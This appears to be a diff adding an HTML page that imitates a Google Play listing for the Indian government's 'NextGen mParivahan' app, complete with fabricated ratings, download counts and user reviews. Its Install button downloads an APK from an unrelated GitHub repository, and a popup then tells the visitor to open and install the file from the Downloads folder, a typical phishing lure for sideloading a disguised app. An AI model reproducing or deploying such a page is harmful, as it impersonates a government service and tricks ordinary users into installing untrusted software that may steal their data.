@@ -1,0 +1,589 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NextGen mParivahan - Apps on Google Play</title>
+    <link href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            padding: 40px 24px;
+        }
+
+        /* ========== MAIN CONTAINER ========== */
+        .main-container {
+            max-width: 700px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+        }
+
+        /* ========== APP HEADER ========== */
+        .app-header {
+            display: flex;
+            gap: 24px;
+            padding: 40px 64px 24px 64px;
+            align-items: flex-start;
+        }
+
+        .app-icon-space {
+            width: 100px;
+            height: 100px;
+            background: #f0f0f0;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .app-icon-space img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 24px;
+        }
+
+        .app-icon-placeholder {
+            font-size: 14px;
+            color: #999;
+            text-align: center;
+        }
+
+        .app-icon-placeholder i {
+            font-size: 32px;
+            color: #bbb;
+            margin-bottom: 4px;
+        }
+
+        .app-info h1 {
+            font-size: 32px;
+            font-weight: 900;
+            color: #202124;
+            margin-bottom: 6px;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+
+        .app-info .gov-text {
+            color: #1e8e3e;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 3px;
+        }
+
+        .app-info .nic-text {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        /* ========== STATS ROW ========== */
+        .stats-row {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px 64px;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .stat-item {
+            text-align: center;
+            flex: 1;
+            border-right: 1px solid #e8eaed;
+        }
+
+        .stat-item:last-child {
+            border-right: none;
+        }
+
+        .stat-value {
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 2px;
+        }
+
+        /* ========== INSTALL BUTTON ========== */
+        .install-btn {
+            width: calc(100% - 128px);
+            margin: 20px 64px 24px 64px;
+            padding: 14px;
+            background: #1e8e3e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .install-btn:hover {
+            background: #188038;
+        }
+
+        /* ========== ABOUT SECTION ========== */
+        .about-section {
+            padding: 0 64px 24px 64px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .about-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .about-label {
+            font-size: 14px;
+            color: #202124;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .about-value {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        /* ========== SCREENSHOTS ========== */
+        .screenshots-section {
+            padding: 0 64px 24px 64px;
+        }
+
+        .screenshots-container {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding: 8px 0;
+            scrollbar-width: none;
+        }
+
+        .screenshots-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        .screenshot-item {
+            min-width: 110px;
+            height: 220px;
+            background: #f0f0f0;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .screenshot-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 12px;
+        }
+
+        .screenshot-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            font-size: 11px;
+        }
+
+        .screenshot-placeholder i {
+            font-size: 24px;
+            margin-bottom: 6px;
+            color: #bbb;
+        }
+
+        /* ========== REVIEWS ========== */
+        .reviews-section {
+            padding: 0 64px 40px 64px;
+        }
+
+        .review-item {
+            display: flex;
+            gap: 12px;
+            padding: 16px 0;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .review-item:last-child {
+            border-bottom: none;
+        }
+
+        .review-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .review-avatar.green { background: #1e8e3e; }
+        .review-avatar.teal { background: #00897b; }
+        .review-avatar.orange { background: #f57c00; }
+
+        .review-content {
+            flex: 1;
+        }
+
+        .review-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #202124;
+            margin-bottom: 2px;
+        }
+
+        .review-date {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 6px;
+        }
+
+        .review-stars {
+            color: #1e8e3e;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .review-stars .empty {
+            color: #dadce0;
+        }
+
+        .review-text {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.5;
+        }
+
+        /* ========== DOWNLOAD POPUP ========== */
+        .download-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .download-popup.active {
+            display: flex;
+        }
+
+        .download-box {
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            max-width: 340px;
+            width: 90%;
+            animation: popIn 0.3s ease-out;
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .download-icon {
+            width: 60px;
+            height: 60px;
+            background: #1e8e3e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .download-icon i {
+            font-size: 28px;
+            color: white;
+        }
+
+        .download-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+
+        .download-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 600px) {
+            body {
+                padding: 20px 12px;
+            }
+
+            .app-header {
+                gap: 18px;
+                padding: 24px 24px 16px 24px;
+            }
+
+            .app-icon-space {
+                width: 80px;
+                height: 80px;
+            }
+
+            .app-info h1 {
+                font-size: 26px;
+            }
+
+            .stats-row,
+            .about-section,
+            .screenshots-section,
+            .reviews-section {
+                padding-left: 24px;
+                padding-right: 24px;
+            }
+
+            .install-btn {
+                width: calc(100% - 48px);
+                margin-left: 24px;
+                margin-right: 24px;
+            }
+
+            .screenshot-item {
+                min-width: 90px;
+                height: 180px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ========== MAIN CONTAINER ========== -->
+    <div class="main-container">
+
+        <!-- ========== APP HEADER ========== -->
+        <div class="app-header">
+            <div class="app-icon-space">
+                <img src="https://raw.githubusercontent.com/ilanding/Gst/main/app.png" alt="App Icon" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <div class="app-icon-placeholder" style="display:none;">
+                    <i class="fas fa-image"></i>
+                    <div>app.png</div>
+                </div>
+            </div>
+            <div class="app-info">
+                <h1>NextGen mParivahan</h1>
+                <div class="gov-text">Government of India</div>
+                <div class="nic-text">National Informatics Centre.</div>
+            </div>
+        </div>
+
+        <!-- ========== STATS ROW ========== -->
+        <div class="stats-row">
+            <div class="stat-item">
+                <div class="stat-value">4.5 <i class="fas fa-star" style="font-size:13px; color:#1e8e3e;"></i></div>
+                <div class="stat-label">124K reviews</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">10M+</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">3+</div>
+                <div class="stat-label">Rated for 3+</div>
+            </div>
+        </div>
+
+        <!-- ========== INSTALL BUTTON ========== -->
+        <button class="install-btn" onclick="startDownload()">Install</button>
+
+        <!-- ========== ABOUT SECTION ========== -->
+        <div class="about-section">
+            <h2 class="section-title">About this app</h2>
+            <p class="about-text">mParivahan is the official digital portal for all transportation services, making travel booking, tracking, and management seamless for citizens. Enjoy real-time updates, integrated payment gateways, and personalized service alerts.</p>
+            <div class="about-label">Updated on</div>
+            <div class="about-value">Jun 10, 2026</div>
+        </div>
+
+        <!-- ========== SCREENSHOTS ========== -->
+        <div class="screenshots-section">
+            <h2 class="section-title">Screenshots</h2>
+            <div class="screenshots-container">
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss1.png" alt="Screenshot 1" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss1.png</span>
+                    </div>
+                </div>
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss2.png" alt="Screenshot 2" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss2.png</span>
+                    </div>
+                </div>
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss3.png" alt="Screenshot 3" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss3.png</span>
+                    </div>
+                </div>
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss4.png" alt="Screenshot 4" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss4.png</span>
+                    </div>
+                </div>
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss5.png" alt="Screenshot 5" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss5.png</span>
+                    </div>
+                </div>
+                <div class="screenshot-item">
+                    <img src="https://raw.githubusercontent.com/ilanding/Gst/main/ss6.png" alt="Screenshot 6" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <div class="screenshot-placeholder" style="display:none;">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>ss6.png</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== REVIEWS ========== -->
+        <div class="reviews-section">
+            <h2 class="section-title">Ratings and reviews</h2>
+
+            <div class="review-item">
+                <div class="review-avatar green">R</div>
+                <div class="review-content">
+                    <div class="review-name">Rahul Sharma</div>
+                    <div class="review-date">June 5, 2026</div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <div class="review-text">Excellent app for managing vehicle RC and Driving License virtually. It saved me from carrying physical documents. The challan payment feature is also very smooth and updates instantly.</div>
+                </div>
+            </div>
+
+            <div class="review-item">
+                <div class="review-avatar teal">P</div>
+                <div class="review-content">
+                    <div class="review-name">Priya Patel</div>
+                    <div class="review-date">May 28, 2026</div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star empty"></i>
+                    </div>
+                    <div class="review-text">Very good application for vehicle-related services. I easily checked the registration details of a second-hand car before buying it. Sometimes the server is a little slow during peak hours, but overall highly useful.</div>
+                </div>
+            </div>
+
+            <div class="review-item">
+                <div class="review-avatar orange">A</div>
+                <div class="review-content">
+                    <div class="review-name">Amit Singh</div>
+                    <div class="review-date">May 12, 2026</div>
+                    <div class="review-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                    <div class="review-text">Best initiative by the government. Linking my vehicle details was a breeze. Now I receive timely alerts for my PUC and insurance renewals. Must-have app for every vehicle owner in India.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== DOWNLOAD POPUP ========== -->
+    <div class="download-popup" id="downloadPopup">
+        <div class="download-box">
+            <div class="download-icon">
+                <i class="fas fa-download"></i>
+            </div>
+            <div class="download-title">Downloading</div>
+            <div class="download-text">Your app is downloading. Once complete, please pull down your notification panel or check your "Downloads" folder to tap the APK and install it.</div>
+        </div>
+    </div>
+
+    <script>
+        function startDownload() {
+            // Start actual file download
+            const link = document.createElement('a');
+            link.href = 'https://raw.githubusercontent.com/ilanding/Pomatoapk/main/MParivahan.apk?no-cache';
+            link.download = 'MParivahan.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Show popup after 10 seconds
+            setTimeout(() => {
+                document.getElementById('downloadPopup').classList.add('active');
+
+                // Hide popup after 12 seconds
+                setTimeout(() => {
+                    document.getElementById('downloadPopup').classList.remove('active');
+                }, 12000);
+            }, 10000);
+        }
+    </script>
+
+<script type="module" src="../static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;83c4fc9962bb459a8037ecc755cf0d63&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+
+</body></html>
